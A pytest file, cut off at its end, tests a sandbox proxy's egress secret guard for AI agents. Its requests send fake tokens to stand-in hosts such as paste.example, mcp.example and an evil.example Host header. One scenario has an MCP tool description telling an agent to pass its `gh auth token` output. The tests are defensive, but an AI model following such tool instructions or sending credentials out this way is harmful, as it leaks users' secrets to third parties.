"""The secret guard (egress DLP) end to end: fixture servers behind the real connection proxy (real TLS on both sides,
the real HTTP path, the real log), the supervisor's real approval broker for its questions, the safeguards' and the
report's reading of the log.

The scenarios of the Knostic research (research-llm/knostic-research-2026-11.md): A2 - an agent uploads a file with an
API key in it; A3 - a key written into a test file is posted (here: through an API, where no push check looks); A4 - a
token passed to an MCP tool as an argument (a remote MCP server, reached through the proxy). And the model's context:
a secret the agent read goes to the provider with the conversation - recorded, never held.

Every secret here is assembled at run time and worthless; nothing talks to a real server: the proxy's original
destination is the fixture, which answers under each host name (one certificate each, chosen by SNI)."""
import base64
import gzip
import http.server
import importlib.util
import json
import os
from pathlib import Path
import shutil
import socket
import ssl
import string
import sys
import threading
import time
import urllib.parse

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent))
import test_proxy as tp  # noqa: E402

ROOT = Path(__file__).resolve().parents[1]
rt = tp.rt


def load(name, file):
    spec = importlib.util.spec_from_file_location(name, ROOT / "sandbox" / file)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


approvals = load("sandbox_approvals_secrets", "approvals.py")
safeguards = load("sandbox_safeguards_secrets", "safeguards.py")
guard_host = load("sandbox_secret_guard_tests", "secret_guard.py")

pytestmark = pytest.mark.skipif(not shutil.which("openssl"), reason="needs openssl")
PROVIDER = "api.provider.test"
HOSTS = ("paste.example", "api.github.com", "api.service.example", "mcp.example", "generativelanguage.googleapis.com",
         PROVIDER)
TAIL = (string.ascii_letters + string.digits) * 2
# Assembled here, so that no scanner takes this file for real keys; none of them is one.
API_TOKEN = "tok" + "-" + TAIL[5:41] + "/+" + TAIL[3:9]        # a --secret-env value of no known shape
GIT_TOKEN = "gh" + "p_" + TAIL[7:43]                           # --git-token-env for github.com
GOOGLE_KEY = "AI" + "za" + TAIL[11:46]                         # a key the agent read from a file
OTHER_GITHUB = "gh" + "o_" + TAIL[20:56]                       # a token the agent got elsewhere (gh auth token)
PRIVATE_KEY = "-----BEGIN OPENSSH " + "PRIVATE KEY-----\n" + TAIL[:64] + "\n-----END OPENSSH " + "PRIVATE KEY-----\n"
SECRETS = (API_TOKEN, GIT_TOKEN, GOOGLE_KEY, OTHER_GITHUB)


def settings(**changes):
    """proxy.json's "secrets" as a start writes it (secret_guard.proxy_settings) for a run that was given API_TOKEN
    with --secret-env and GIT_TOKEN with --git-token-env for github.com."""
    values = [{"id": "env:API_TOKEN", "label": "the value of API_TOKEN (--secret-env)", "value": API_TOKEN, "hosts": []},
              {"id": "git-token:github.com", "label": "the Git token for github.com (--git-token-env)", "value": GIT_TOKEN,
               "hosts": ["github.com", "*.github.com"]}]
    return guard_host.proxy_settings(values, [], allow=changes.pop("allow", ()), providers=[PROVIDER],
                                     mode=changes or None, mode_name="test")


def servers():
    """A handler class for the fixture servers and what reached them: (host, method, path, headers, body)."""
    seen = []

    class Server(http.server.BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def log_message(self, *args):
            pass

        def body(self):
            if "chunked" in self.headers.get("Transfer-Encoding", ""):
                data = b""
                while True:
                    size = int(self.rfile.readline().split(b";")[0], 16)
                    if not size:
                        self.rfile.readline()
                        return data
                    data += self.rfile.read(size)
                    self.rfile.readline()
            return self.rfile.read(int(self.headers.get("Content-Length", 0)))

        def answer(self):
            host = (self.headers.get("Host") or "").split(":")[0]
            try:
                seen.append((host, self.command, self.path, dict(self.headers.items()), self.body()))
            except (OSError, ValueError):  # the proxy cut the request off in the middle of its body
                self.close_connection = True
                return
            body = b'{"ok": true}'
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        do_GET = do_POST = do_PUT = answer
    return Server, seen


@pytest.fixture
def world(tmp_path):
    """The fixture servers behind a real proxy with the secret guard: send(host, path, body) -> the agent's answer."""
    session, upstream = tmp_path / "session-run", tmp_path / "upstream-run"
    rt.create_ca(session, tmp_path / "session-ca", bundles=())
    rt.create_ca(upstream, tmp_path / "upstream-ca", bundles=())
    contexts = {}
    for host in HOSTS:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(str(rt.server_certificate(upstream, host)), str(upstream / "leaf.key"))
        contexts[host] = context
    front = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    front.load_cert_chain(str(rt.server_certificate(upstream, HOSTS[0])), str(upstream / "leaf.key"))

    def choose(sock, name, _context):
        if name in contexts:
            sock.context = contexts[name]
    front.sni_callback = choose
    pki = {"run": session, "ca": tmp_path / "session-ca" / "ca.pem", "server": front,
           "upstream": ssl.create_default_context(cafile=str(upstream / "ca.pem"))}
    handler, seen = servers()
    server = tp.serve(handler, front)
    server.handle_error = lambda request, client_address: None  # (a request the proxy cut off: no traceback here)
    made = []

    class World:
        log = tmp_path / "connections.jsonl"

        def start(self, secrets=None, asker=None, **config):
            proxy = tp.Proxy(tmp_path, pki, server.server_address[1],
                             {**({} if secrets is False else {"secrets": secrets or settings()}),
                              "providers": [PROVIDER], **config})
            proxy.server.asker = asker
            made.append(proxy)
            self.proxy, self.seen, self.pki = proxy, seen, pki
            return self

        def send(self, host, path="/", body=None, headers=(), method=None, chunks=None, claim=None):
            method = method or ("GET" if body is None and chunks is None else "POST")
            lines = [f"{method} {path} HTTP/1.1", f"Host: {claim or host}", "Connection: close", *headers]
            if chunks is not None:
                lines.append("Transfer-Encoding: chunked")
                data = b"".join(b"%x\r\n%s\r\n" % (len(chunk), chunk) for chunk in chunks) + b"0\r\n\r\n"
            else:
                data = body or b""
                if body is not None:
                    lines.append(f"Content-Length: {len(data)}")
            try:
                return tp.https_request(self.proxy.port, pki["ca"], ("\r\n".join(lines) + "\r\n\r\n").encode() + data,
                                        name=host)
            except (ssl.SSLError, OSError) as exc:  # cut off in the middle of its body
                return f"closed: {exc}".encode()

        def records(self, until=None, wait=2.0):
            until = until or (lambda r: r.get("event") in ("http", "denied"))
            return [r for r in self.proxy.records(wait, until=until) if until(r)]

        def secret(self, wait=2.0):
            """The "secret" of the last record that has one."""
            return self.records(lambda r: isinstance(r.get("secret"), dict), wait)[-1]["secret"]
    World.pki = pki
    yield World()
    for proxy in made:
        proxy.close()
    server.shutdown()


class Asker:
    def __init__(self, decision="allow", scope="once"):
        self.decision, self.scope, self.questions = decision, scope, []

    def __call__(self, kind, details):
        self.questions.append((kind, details))
        return {"decision": self.decision, "scope": self.scope, "reason": "answered"}


def no_secret_in(*texts):
    """None of the fixture secrets, in any of the forms a request may carry them, is in TEXTS."""
    forms = {form for secret in SECRETS for form in guard_host.forms(secret)}
    for text in texts:
        text = text if isinstance(text, str) else json.dumps(text)
        for form in forms:
            assert form not in text, f"a secret ({form[:6]}...) in: {text[:300]}"
    return True


def safeguard_of(record):
    return safeguards.from_connection(record, "run-1", safeguards.Redactor())


# --- A2: an agent uploads a local file with an API key in it ---------------------------------------------------------

def test_a2_an_uploaded_file_with_a_known_value_is_reported_and_passes(world):
    world.start()
    upload = json.dumps({"files": {"notes.txt": {"content": base64.b64encode(
        b"deploy with " + API_TOKEN.encode() + b" please").decode()}}}).encode()
    assert world.send("paste.example", "/api/paste", upload).startswith(b"HTTP/1.1 200")
    record = world.records(lambda r: r.get("event") == "http")[-1]
    assert record["secret"] == {"host": "paste.example", "decision": "report", "found": [
        {"id": "env:API_TOKEN", "kind": "value", "label": "the value of API_TOKEN (--secret-env)", "where": "body",
         "encoding": "base64"}]}
    assert world.seen[-1][4] == upload  # nothing was changed on its way
    found = safeguard_of(record)
    assert found["kind"] == "secret-send" and found["level"] == "warning" and found["target"] == "paste.example"
    assert found["what"] == "the value of API_TOKEN (--secret-env) went to paste.example (POST, in the body, base64)"
    assert "--allow-send env:API_TOKEN@paste.example" in found["fix"]
    assert "sandbox-ai secret-guard allow env:API_TOKEN@paste.example" in found["fix"]
    assert no_secret_in(world.log.read_text(), found)
    # the same value to the same host again: the request's record says so, the safeguards say it once
    assert world.send("paste.example", "/api/paste", upload).startswith(b"HTTP/1.1 200")
    again = world.records(lambda r: r.get("event") == "http")[-1]
    assert again["secret"]["repeat"] is True and safeguard_of(again) is None


def test_a2_with_block_the_upload_is_refused_before_anything_of_it_is_sent(world):
    world.start(settings(on_send="block"))
    upload = b"--x\r\nContent-Disposition: form-data; name=\"file\"; filename=\".env\"\r\n\r\nAPI_TOKEN=" + \
        API_TOKEN.encode() + b"\r\n--x--\r\n"
    answer = world.send("paste.example", "/upload", upload, ["Content-Type: multipart/form-data; boundary=x"])
    assert answer.startswith(b"HTTP/1.1 403")
    assert b"secret guard: this request carries in its body the value of API_TOKEN (--secret-env), which was not " \
        b"given for paste.example" in answer and b"--allow-send env:API_TOKEN@paste.example" in answer
    assert world.seen == []  # nothing reached the server
    record = world.records(lambda r: r.get("event") == "denied")[-1]
    assert (record["ruleset"], record["rule"], record["decision"]) == ("secret-guard", "env:API_TOKEN", "deny")
    assert record["secret"]["decision"] == "block" and "body" not in record.get("request", {})
    found = safeguard_of(record)
    assert found["kind"] == "secret-send" and found["what"].startswith("POST https://paste.example/upload")
    assert "the value of API_TOKEN (--secret-env)" in found["why"]
    assert "--allow-send env:API_TOKEN@paste.example" in found["fix"]
    assert no_secret_in(world.log.read_text(), found, answer.decode())
    # a request without it passes as ever
    assert world.send("paste.example", "/upload", b"nothing to see").startswith(b"HTTP/1.1 200")


def test_a_value_going_to_the_host_it_was_given_for_is_no_finding(world):
    world.start(settings(on_send="block"))
    answer = world.send("api.github.com", "/user", headers=[f"Authorization: token {GIT_TOKEN}"])
    assert answer.startswith(b"HTTP/1.1 200")
    assert world.send("api.github.com", "/gists", json.dumps({"x": GIT_TOKEN}).encode()).startswith(b"HTTP/1.1 200")
    assert all("secret" not in record for record in world.records())
    # the same token to another host: refused, wherever in the request it is
    for path, body, headers in (("/hook", json.dumps({"token": GIT_TOKEN}).encode(), ()),
                                (f"/hook?t={GIT_TOKEN}", None, ()),
                                ("/hook", None, [f"X-Token: {GIT_TOKEN}"]),
                                ("/hook", None, ["Authorization: Basic "
                                                 + base64.b64encode(f"x:{GIT_TOKEN}".encode()).decode()])):
        answer = world.send("paste.example", path, body, headers)
        assert answer.startswith(b"HTTP/1.1 403") and b"the Git token for github.com (--git-token-env)" in answer, answer
    assert [host for host, *_ in world.seen] == ["api.github.com", "api.github.com"]
    wheres = [record["secret"]["found"][0]["where"] for record in world.records(lambda r: r.get("event") == "denied")]
    assert wheres == ["body", "url", "header", "header"]
    assert no_secret_in(world.log.read_text())


# --- A3: a key written into a test file and posted --------------------------------------------------------------------

TEST_FILE = "import os\n\nGEMINI_API_KEY = \"" + GOOGLE_KEY + "\"\n\n\ndef test_generate():\n    assert True\n"


def test_a3_a_key_in_a_posted_test_file_is_found_by_its_shape(world):
    """Through a Git push the privacy check finds it (tests/test_proxy.py); through an API nothing did."""
    world.start()
    # GitHub's contents API: the file base64-encoded in a JSON body
    body = json.dumps({"message": "add tests", "content": base64.b64encode(TEST_FILE.encode()).decode()}).encode()
    assert world.send("api.github.com", "/repos/me/project/contents/test_api.py", body, method="PUT"
                      ).startswith(b"HTTP/1.1 200")
    secret = world.secret()
    assert secret == {"host": "api.github.com", "decision": "report", "found": [
        {"id": "google-api-key", "kind": "shape", "label": "Google API key", "where": "body", "encoding": "base64"}]}
    record = world.records(lambda r: r.get("secret"))[-1]
    found = safeguard_of(record)
    assert found["kind"] == "secret-send"
    assert found["what"] == "what looks like a Google API key went to api.github.com (PUT, in the body, base64)"
    assert "--allow-send google-api-key@api.github.com" in found["fix"]
    # as it is, to a paste site
    assert world.send("paste.example", "/raw", TEST_FILE.encode()).startswith(b"HTTP/1.1 200")
    assert world.secret()["found"] == [{"id": "google-api-key", "kind": "shape", "label": "Google API key",
                                       "where": "body"}]
    assert no_secret_in(world.log.read_text(), found)


def test_a3_in_the_strict_modes_the_human_is_asked_and_sees_the_kind_never_the_value(world):
    asker = Asker("deny")
    world.start(settings(on_shape="ask"), asker=asker)
    answer = world.send("paste.example", "/raw?name=test_api.py", TEST_FILE.encode())
    assert answer.startswith(b"HTTP/1.1 403") and b"not approved (answered)" in answer
    assert b"in its body what looks like a Google API key" in answer and world.seen == []
    (kind, details), = asker.questions
    assert kind == "http" and details["ruleset"] == "secret-guard" and details["rule"] == "google-api-key"
    assert details["secret"] == {"host": "paste.example", "found": [
        {"id": "google-api-key", "kind": "shape", "label": "Google API key", "where": "body"}],
        "allow": "sandbox-ai secret-guard allow google-api-key@paste.example"}
    assert "body" not in details and no_secret_in(details)
    assert approvals.describe({"id": "1-2-3", "kind": "http", **details}).startswith(
        "send what looks like a Google API key to paste.example (POST https://paste.example/raw?name=test_api.py, "
        "in the body)")
    # allowed: it goes out as it is
    asker.decision = "allow"
    assert world.send("paste.example", "/raw", TEST_FILE.encode()).startswith(b"HTTP/1.1 200")
    assert world.seen[-1][4] == TEST_FILE.encode()
    record = world.records(lambda r: r.get("event") == "http")[-1]
    assert record["approval"]["decision"] == "allow" and record["secret"]["decision"] == "ask"
    assert safeguard_of(record) is None  # the human's own answer
    # a token in the path itself: no question, refusal or record shows it
    asker.decision = "deny"
    answer = world.send("paste.example", f"/files/{OTHER_GITHUB}/raw")
    assert answer.startswith(b"HTTP/1.1 403") and b"in its URL what looks like a GitHub token" in answer
    assert asker.questions[-1][1]["rule"] == "github-token"
    assert no_secret_in(asker.questions[-1][1], answer.decode(), world.log.read_text())


def test_a_private_key_and_a_compressed_body(world):
    world.start(settings(on_shape="block"))
    answer = world.send("paste.example", "/k", gzip.compress(b"x" * 5000 + PRIVATE_KEY.encode()),
                        ["Content-Encoding: gzip"])
    assert answer.startswith(b"HTTP/1.1 403") and b"in its body (gzip) what looks like private key material" in answer
    assert world.records(lambda r: r.get("event") == "denied")[-1]["secret"]["found"] == [
        {"id": "private-key", "kind": "shape", "label": "private key material", "where": "body", "encoding": "gzip"}]
    answer = world.send("paste.example", "/k", gzip.compress(b"token " + API_TOKEN.encode()), ["Content-Encoding: gzip"])
    assert answer.startswith(b"HTTP/1.1 200")  # known values are reported in this run, shapes refused
    assert world.secret()["found"][0] == {"id": "env:API_TOKEN", "kind": "value", "label": "the value of API_TOKEN (--secret-env)",
                                          "where": "body", "encoding": "plain+gzip"}


# --- A4: a token passed to an MCP tool as an argument -----------------------------------------------------------------

def tool_call(**arguments):
    return json.dumps({"jsonrpc": "2.0", "id": 7, "method": "tools/call",
                       "params": {"name": "get_started", "arguments": arguments}}).encode()


def test_a4_a_token_in_a_tool_argument_of_a_remote_mcp_server(world):
    """The tool's description told the agent to run `gh auth token` and pass the result: with --git-token-env and
    no --token-proxy that is the run's real token (a known value); a token the agent got elsewhere is told by its
    shape."""
    asker = Asker("deny", "run")
    world.start(settings(on_send="block", on_shape="ask"), asker=asker)
    headers = ["Content-Type: application/json", "Accept: application/json, text/event-stream"]
    answer = world.send("mcp.example", "/mcp", tool_call(token=GIT_TOKEN, repo="me/project"), headers)
    assert answer.startswith(b"HTTP/1.1 403")
    assert b"in its body the Git token for github.com (--git-token-env), which was not given for mcp.example" in answer
    assert asker.questions == [] and world.seen == []  # a known value: refused without a question in this run
    answer = world.send("mcp.example", "/mcp", tool_call(token=OTHER_GITHUB), headers)
    assert answer.startswith(b"HTTP/1.1 403") and b"in its body what looks like a GitHub token" in answer
    (kind, details), = asker.questions
    assert details["rule"] == "github-token" and details["host"] == "mcp.example" and no_secret_in(details)
    # a call without a credential is none of the guard's
    assert world.send("mcp.example", "/mcp", tool_call(repo="me/project"), headers).startswith(b"HTTP/1.1 200")
    assert len(world.seen) == 1 and no_secret_in(world.log.read_text())
    records = world.records(lambda r: r.get("event") == "denied")
    assert [r["rule"] for r in records] == ["git-token:github.com", "github-token"]
    assert safeguard_of(records[1]) is None  # the human said no
    found = safeguard_of(records[0])
    assert found["kind"] == "secret-send" and found["rule"] == "git-token:github.com"


def test_a_token_is_no_finding_in_its_own_services_login(world):
    """`gh` with a token of its own, the Gemini API's key in the URL: a credential where its service expects it."""
    world.start(settings(on_shape="block"))
    assert world.send("api.github.com", "/user", headers=[f"Authorization: Bearer {OTHER_GITHUB}"]
                      ).startswith(b"HTTP/1.1 200")
    assert world.send("generativelanguage.googleapis.com", f"/v1/models?key={GOOGLE_KEY}").startswith(b"HTTP/1.1 200")
    assert all("secret" not in record for record in world.records())
    # in a body it is content, and to any other host it is a finding
    assert world.send("api.github.com", "/gists", json.dumps({"files": {"t": {"content": OTHER_GITHUB}}}).encode()
                      ).startswith(b"HTTP/1.1 403")
    assert world.send("paste.example", "/x", headers=[f"Authorization: Bearer {OTHER_GITHUB}"]
                      ).startswith(b"HTTP/1.1 403")
    assert world.send("paste.example", f"/x?key={GOOGLE_KEY}").startswith(b"HTTP/1.1 403")
    assert no_secret_in(world.log.read_text())


# --- the model's context ------------------------------------------------------------------------------------------------

def conversation(*texts):
    return json.dumps({"model": "m", "messages": [{"role": "user", "content": text} for text in texts]}).encode()


def test_a_secret_in_a_model_request_is_a_context_event_and_never_held(world):
    asker = Asker("deny")
    world.start(settings(on_send="block", on_shape="block"), asker=asker)
    headers = [f"Authorization: Bearer {API_TOKEN}", f"x-api-key: {OTHER_GITHUB}"]  # the login at the provider
    assert world.send(PROVIDER, "/v1/messages", conversation("hello"), headers).startswith(b"HTTP/1.1 200")
    assert "secret" not in world.records()[-1]
    body = conversation("hello", "cat .env\nGEMINI_API_KEY=" + GOOGLE_KEY + "\nAPI_TOKEN=" + API_TOKEN)
    assert world.send(PROVIDER, "/v1/messages", body, headers).startswith(b"HTTP/1.1 200")
    assert world.seen[-1][4] == body and asker.questions == []  # passed as it is: nothing is redacted or asked
    record = world.records()[-1]
    assert record["secret"] == {"host": PROVIDER, "context": True, "decision": "report", "found": [
        {"id": "env:API_TOKEN", "kind": "value", "label": "the value of API_TOKEN (--secret-env)", "where": "body", "encoding": "plain"},
        {"id": "google-api-key", "kind": "shape", "label": "Google API key", "where": "body"}]}
    found = safeguard_of(record)
    assert found["kind"] == "secret-context" and found["target"] == PROVIDER
    assert found["what"] == ("the value of API_TOKEN (--secret-env) and what looks like a Google API key entered the "
                             f"model's context (a request to {PROVIDER})")
    assert "nothing was held or changed" in found["why"]
    # the conversation goes on and carries it every time: said once
    longer = conversation("hello", "cat .env\nGEMINI_API_KEY=" + GOOGLE_KEY + "\nAPI_TOKEN=" + API_TOKEN, "thanks")
    assert world.send(PROVIDER, "/v1/messages", longer, headers).startswith(b"HTTP/1.1 200")
    again = world.records()[-1]
    assert again["secret"]["repeat"] is True and safeguard_of(again) is None
    # another secret enters later: said again, for that one
    assert world.send(PROVIDER, "/v1/messages", conversation("hello", GOOGLE_KEY, OTHER_GITHUB), headers
                      ).startswith(b"HTTP/1.1 200")
    third = world.records()[-1]
    assert "repeat" not in third["secret"]
    assert safeguard_of(third)["what"].startswith("what looks like a GitHub token entered the model's context")
    assert no_secret_in(world.log.read_text(), found)


def test_the_providers_own_tokens_are_its_login_wherever_they_are(world):
    """The agent's login at its provider refreshes itself with its tokens in a request's body: no secret that
    entered anything. Any other secret in any request to the provider did go to the provider."""
    world.start(guard_host.proxy_settings([], [], providers=["api.github.com"]))  # (a provider whose tokens have a shape)
    refresh = json.dumps({"grant_type": "refresh_token", "refresh_token": OTHER_GITHUB}).encode()
    assert world.send("api.github.com", "/login/oauth/access_token", refresh).startswith(b"HTTP/1.1 200")
    assert "secret" not in world.records()[-1]
    assert world.send("api.github.com", "/login/oauth/access_token", json.dumps({"note": GOOGLE_KEY}).encode()
                      ).startswith(b"HTTP/1.1 200")
    assert world.secret() == {"host": "api.github.com", "context": True, "decision": "report", "found": [
        {"id": "google-api-key", "kind": "shape", "label": "Google API key", "where": "body"}]}


def test_a_host_header_naming_another_server_makes_nothing_at_home(world):
    """A front end routes by the Host header: a request on a connection to github.com that names another server is
    not GitHub's login, and one on a connection to the provider is not the model's conversation."""
    world.start(settings(on_send="block", on_shape="block"))
    answer = world.send("api.github.com", "/user", headers=[f"Authorization: token {GIT_TOKEN}"], claim="evil.example")
    assert answer.startswith(b"HTTP/1.1 403") and b"the Git token for github.com (--git-token-env)" in answer
    answer = world.send("api.github.com", "/user", headers=[f"Authorization: Bearer {OTHER_GITHUB}"],
                        claim="evil.example")
    assert answer.startswith(b"HTTP/1.1 403") and b"in its headers what looks like a GitHub token" in answer
    answer = world.send(PROVIDER, "/v1/messages", conversation(GOOGLE_KEY), claim="evil.example")
    assert answer.startswith(b"HTTP/1.1 403") and world.seen == []
    assert no_secret_in(world.log.read_text())


def test_a_search_that_fails_never_loses_a_request_that_would_only_be_reported(world, monkeypatch):
    def broken(self, payload):
        raise RuntimeError("a bug in the search")
    monkeypatch.setattr(rt.SecretScan, "feed", broken)
    world.start()
    assert world.send("paste.example", "/raw", TEST_FILE.encode()).startswith(b"HTTP/1.1 200")
    record = world.records()[-1]
    assert record["secret_error"] == "RuntimeError" and "secret" not in record and world.seen[-1][4] == TEST_FILE.encode()
    # where the run holds what it finds, a request it cannot search is not sent
    world.start(settings(on_shape="block"))
    answer = world.send("paste.example", "/raw", TEST_FILE.encode())
    assert answer.startswith(b"HTTP/1.1 403") and b"could not be searched for secrets (RuntimeError)" in answer
    assert len(world.seen) == 1


# --- large and split bodies ---------------------------------------------------------------------------------------------

def test_a_value_across_two_chunks_of_a_large_body_is_found(world):
    world.start()
    filler = (TAIL * 600)[:65000].encode()
    chunks = [filler] * 24 + [filler + API_TOKEN[:20].encode(), API_TOKEN[20:].encode() + filler] + [filler] * 24
    assert sum(map(len, chunks)) > 3 << 20
    assert world.send("paste.example", "/big", chunks=chunks).startswith(b"HTTP/1.1 200")
    assert world.secret(wait=10)["found"] == [{"id": "env:API_TOKEN", "kind": "value", "label": "the value of API_TOKEN (--secret-env)",
                                               "where": "body", "encoding": "plain"}]
    assert len(world.seen[-1][4]) == sum(map(len, chunks))


def test_with_block_a_large_body_is_cut_where_the_value_comes(world):
    world.start(settings(on_send="block"))
    filler = (TAIL * 600)[:65000].encode()
    chunks = [filler] * 24 + [filler + API_TOKEN[:20].encode(), API_TOKEN[20:].encode() + filler] + [filler] * 4
    answer = world.send("paste.example", "/big", chunks=chunks)
    assert not answer.startswith(b"HTTP/1.1 200")
    record = world.records(lambda r: r.get("event") == "denied", wait=10)[-1]
    assert record["rule"] == "env:API_TOKEN" and "past the first" in record["reason"]
    time.sleep(0.2)
    assert not any(API_TOKEN.encode() in body for *_, body in world.seen)  # the value never arrived whole


def test_past_the_first_mebibyte_a_question_is_not_asked_the_finding_is_recorded(world):
    asker = Asker("deny")
    world.start(settings(on_shape="ask"), asker=asker)
    filler = (TAIL * 600)[:65000].encode()
    chunks = [filler] * 20 + [b"\n" + GOOGLE_KEY.encode() + b"\n"] + [filler] * 2
    assert world.send("paste.example", "/big", chunks=chunks).startswith(b"HTTP/1.1 200")
    secret = world.secret(wait=10)
    assert secret["decision"] == "report" and secret["past_limit"] is True and asker.questions == []
    assert "not held" in safeguard_of(world.records(lambda r: r.get("secret"))[-1])["why"]


def test_a_request_that_breaks_off_is_searched_for_what_went_out(world):
    """The server takes the body and closes without an answer: the record still says what the body carried."""
    listener = socket.socket()
    listener.bind(("127.0.0.1", 0))
    listener.listen()

    def take_and_close():
        raw, _ = listener.accept()
        with world.pki["server"].wrap_socket(raw, server_side=True) as tls:
            data = b""
            while API_TOKEN.encode() not in data:
                data += tls.recv(65536)
    threading.Thread(target=take_and_close, daemon=True).start()
    proxy = tp.Proxy(world.log.parent, world.pki, listener.getsockname()[1], {"secrets": settings()})
    try:
        request = b"POST /drop HTTP/1.1\r\nHost: paste.example\r\nContent-Length: %d\r\n\r\n" % (len(API_TOKEN) + 4)
        with pytest.raises((ssl.SSLError, OSError, AssertionError)):
            answer = tp.https_request(proxy.port, world.pki["ca"], request + b"key=" + API_TOKEN.encode(),
                                      name="paste.example")
            assert answer.startswith(b"HTTP/1.1 200")
        record = [r for r in proxy.records(until=lambda r: r.get("event") == "http") if r.get("event") == "http"][-1]
        assert record["secret"]["found"][0]["id"] == "env:API_TOKEN" and "error" in record
    finally:
        proxy.close()
        listener.close()


def test_base64_is_decoded_across_the_pieces_of_a_body_and_across_its_line_breaks():
    guard = rt.SecretGuard(settings())
    encoded = base64.b64encode(("# notes\n" * 9 + TEST_FILE + "# end\n" * 9).encode())
    assert GOOGLE_KEY.encode() not in encoded

    def found_in(pieces, context=False):
        scan = rt.SecretScan(guard, "paste.example", context, [])
        return [(finding["id"], finding.get("encoding")) for piece in pieces for finding in scan.feed(piece)]
    whole = b'{"content": "' + encoded + b'"}'
    assert found_in([whole]) == [("google-api-key", "base64")]
    for cut in range(20, len(whole) - 20, 7):  # wherever the body is cut in two - also inside the key
        assert ("google-api-key", "base64") in found_in([whole[:cut], whole[cut:]]), cut
    assert ("google-api-key", "base64") in found_in([whole[index:index + 5] for index in range(0, len(whole), 5)])
    # wrapped as MIME and PEM wrap it, with line breaks as they are and as JSON has them
    for width, line_break in ((76, b"\r\n"), (64, b"\n"), (76, b"\\n"), (64, b"\\r\\n")):
        wrapped = line_break.join(encoded[index:index + width] for index in range(0, len(encoded), width))
        assert ("google-api-key", "base64") in found_in([b"Content-Transfer-Encoding: base64\r\n\r\n" + wrapped])
    # URL-safe base64, and without padding
    urlsafe = base64.urlsafe_b64encode(b"\xfb\xff\xfe" + TEST_FILE.encode()).rstrip(b"=")
    assert found_in([b"data=" + urlsafe + b"&x=1"]) == [("google-api-key", "base64")]
    # not on the way to the provider: its requests carry megabytes of pictures, and base64 there is left alone
    assert found_in([whole], context=True) == []
    # text that only looks like base64 decodes to nothing that matters
    assert found_in([b"/usr/lib/python3/dist-packages/some_long_module_name_here/and_more.py " * 50]) == []


def test_every_value_is_told_wherever_it_lies_whatever_the_bodys_alignment():
    """The values' forms are told by four bytes at every 16th place of the data: the same as searching for each."""
    import random
    rng = random.Random(7)
    alphabet = (string.ascii_letters + string.digits + "+/=_-").encode()

    def text(length):
        return bytes(rng.choice(alphabet) for _ in range(length))
    forms = [[text(length).decode(), f"v{index}", "plain"] for index, length in
             enumerate([8, 12, 18, 19, 20, 23, 31, 40, 64, 200])]
    matcher = rt.SecretMatcher(forms)
    assert matcher.every(text(5000)) == {}
    for _ in range(300):
        chosen = rng.sample(forms, rng.randrange(0, 3))
        data = text(rng.randrange(0, 70))
        for form in chosen:
            data += form[0].encode() + text(rng.randrange(0, 70))
        assert matcher.every(data) == {form[1]: "plain" for form in chosen}, (data, chosen)
    # a piece shorter than a form, and one that holds half of it: no finding, no error
    assert matcher.every(b"") == {} and matcher.every(forms[-1][0].encode()[:100]) == {}


def test_a_value_registered_during_the_run_is_found_from_then_on(world, tmp_path):
    """A Git login the human gave into the running sandbox (--in-sandbox): the supervisor hands its forms to the
    proxy, whose guard takes them in at the next request."""
    world.start(settings(on_send="block"))
    login = "glp" + "x-" + TAIL[30:60]
    assert world.send("paste.example", "/x", login.encode()).startswith(b"HTTP/1.1 200")
    entries = guard_host.added_entries([guard_host.value_entry(
        "git-login:git.example.com", "the Git login for git.example.com (given into the sandbox)", login,
        guard_host.server_hosts("git.example.com"))])
    assert rt.give_secret_values(entries, world.pki["run"] / rt.SECRET_ADDED, owner=(os.getuid(), os.getgid())) == [
        "git-login:git.example.com"]
    answer = world.send("paste.example", "/x", base64.b64encode(login.encode()))
    assert answer.startswith(b"HTTP/1.1 403")
    assert b"in its body (base64) the Git login for git.example.com (given into the sandbox)" in answer
    refused = world.log.read_text().splitlines()[-1]
    assert no_secret_in(refused) and base64.b64encode(login.encode()).decode() not in refused
    # taken back (the login was revoked): no finding any more; a list that is none is refused
    assert rt.give_secret_values([], world.pki["run"] / rt.SECRET_ADDED, owner=(os.getuid(), os.getgid())) == []
    assert world.send("paste.example", "/x", login.encode()).startswith(b"HTTP/1.1 200")
    for junk in ([{"id": "x y", "forms": [["a" * 9, "plain"]]}], [{"id": "ok", "forms": []}], "all", [5]):
        with pytest.raises(ValueError):
            rt.give_secret_values(junk, world.pki["run"] / rt.SECRET_ADDED, owner=(os.getuid(), os.getgid()))


# --- the allow-list ---------------------------------------------------------------------------------------------------

def test_what_the_human_allowed_is_no_finding(world):
    world.start(settings(on_send="block", on_shape="block", allow=[
        "env:API_TOKEN@api.service.example", "google-api-key@*.example", "github-token@*"]))
    assert world.send("api.service.example", "/v1", headers=[f"Authorization: Bearer {API_TOKEN}"]
                      ).startswith(b"HTTP/1.1 200")
    assert world.send("paste.example", "/raw", TEST_FILE.encode()).startswith(b"HTTP/1.1 200")
    assert world.send("mcp.example", "/mcp", tool_call(token=OTHER_GITHUB)).startswith(b"HTTP/1.1 200")
    assert all("secret" not in record for record in world.records())
    assert world.send("paste.example", "/raw", API_TOKEN.encode()).startswith(b"HTTP/1.1 403")
    assert world.send("api.github.com", "/gists", TEST_FILE.encode()).startswith(b"HTTP/1.1 403")
    assert world.send("paste.example", "/raw", PRIVATE_KEY.encode()).startswith(b"HTTP/1.1 403")


def test_allow_list_entries():
    assert guard_host.spec_text("GitHub-Token@Paste.Example.") == "github-token@paste.example"
    assert guard_host.spec_text("env:API_TOKEN@*.example.com") == "env:API_TOKEN@*.example.com"
    assert guard_host.spec_text("*@localhost") == "*@localhost" and guard_host.spec_text("private-key@*") == "private-key@*"
    for junk in ("github-token", "@host", "x@", "a b@host", "x@ho st", "x@*.*", "x@host/path", "x@" + "a" * 300, 5,
                 "nope@host"):
        with pytest.raises(ValueError):
            guard_host.spec_text(junk)
    guard = rt.SecretGuard(settings(allow=["github-token@*.example", "junk", 7, "*@intra.test"]))
    assert guard.allow == [("github-token", "*.example"), ("*", "intra.test")]


# --- the human's answer -------------------------------------------------------------------------------------------------

def answer_next(directory, decision, scope, seen):
